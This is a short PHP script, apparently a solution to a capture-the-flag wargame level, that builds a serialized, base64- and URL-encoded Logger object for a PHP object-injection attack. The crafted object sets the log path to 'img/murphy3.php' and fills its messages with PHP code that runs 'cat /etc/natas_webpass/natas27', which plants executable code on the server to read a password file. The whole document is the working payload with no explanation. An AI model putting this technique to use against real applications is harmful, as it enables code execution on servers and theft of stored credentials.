<?

class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="<? echo exec('cat /etc/natas_webpass/natas27'); ?>\n\n";
            $this->exitMsg="<? echo exec('cat /etc/natas_webpass/natas27'); ?>\n";
            $this->logFile = "img/murphy3.php";
        }                       
      
        function log($msg){
            ;
        }                       
      
        function __destruct(){
            ;
        }                       
    }


$obj = new Logger("test");
echo urlencode(base64_encode(serialize($obj)));

?>
